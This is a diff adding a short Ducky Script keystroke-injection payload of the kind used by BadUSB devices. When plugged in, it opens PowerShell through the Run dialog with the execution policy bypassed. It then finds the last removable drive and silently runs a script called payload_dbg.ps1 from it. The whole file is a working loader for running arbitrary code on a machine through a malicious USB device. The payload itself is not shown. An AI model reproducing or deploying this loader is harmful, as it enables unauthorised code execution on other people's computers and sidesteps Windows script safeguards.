@@ -1,0 +1,23 @@
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell -NoProfile -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+STRING $usbDrive = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | Sort-Object DeviceID -Descending | Select-Object -First 1
+ENTER
+DELAY 500
+STRING if ($usbDrive) {
+ENTER
+STRING     $path = "$($usbDrive.DeviceID)\\scripts\\payload_dbg.ps1"
+ENTER
+STRING     if (Test-Path $path) {
+ENTER
+STRING         Start-Process -FilePath "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$path`"" -NoNewWindow -Wait
+ENTER
+STRING     }
+ENTER
+STRING }
+ENTER
+STRING exit
+ENTER
